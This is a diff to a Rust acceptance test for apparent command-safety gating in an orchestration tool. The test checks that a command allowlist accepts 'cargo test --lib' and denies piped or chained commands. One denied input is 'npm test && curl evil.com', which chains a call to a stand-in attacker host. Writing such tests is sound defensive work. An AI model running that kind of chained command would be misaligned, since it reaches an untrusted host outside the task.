@@ -248,7 +248,7 @@ fn test_acceptance_p7_m2_brief_assembly_and_report_lifecycle() {
 async fn test_acceptance_p7_m3_gate_execution_and_scope_validation() {
     use tokage_orchestration::gate::{
         check_gate_command_safety, execute_gate_command, validate_write_scope,
-        GateCommandPermission,
+        GateCommandPermission, GateRequest,
     };
     use tokage_native::env::ShellEnv;
 
@@ -261,23 +261,36 @@ async fn test_acceptance_p7_m3_gate_execution_and_scope_validation() {
     let safe_cmd = "cargo test --lib";
     let unsafe_pipe = "cargo test | grep FAILED";
     let unsafe_chain = "npm test && curl evil.com";
+    let pack = tokage_matching::pack::builtin_knowledge_pack()
+        .gate_allowlist
+        .clone();
 
     assert!(matches!(
-        check_gate_command_safety(safe_cmd, false, None),
+        check_gate_command_safety(safe_cmd, false, &pack),
         GateCommandPermission::AllowedByPattern(_)
     ));
     assert!(matches!(
-        check_gate_command_safety(unsafe_pipe, true, None),
+        check_gate_command_safety(unsafe_pipe, true, &pack),
         GateCommandPermission::Denied(_)
     ));
     assert!(matches!(
-        check_gate_command_safety(unsafe_chain, true, None),
+        check_gate_command_safety(unsafe_chain, true, &pack),
         GateCommandPermission::Denied(_)
     ));
 
     // 2. Local execution of gate command (runs 'echo Gate Passed')
     // We confirm this command explicitly
-    let run_res = execute_gate_command("echo Gate Passed", temp_dir.path(), &env, Some(10), true).await;
+    let run_res = execute_gate_command(GateRequest {
+        command: "echo Gate Passed",
+        workdir: temp_dir.path(),
+        env: &env,
+        timeout_secs: Some(10),
+        confirmed: true,
+        allowlist: &pack,
+        env_allow: &[],
+        run_id: None,
+    })
+    .await;
     assert!(run_res.passed);
     assert_eq!(run_res.exit_code, Some(0));
     assert!(run_res.output_tail.contains("Gate Passed"));
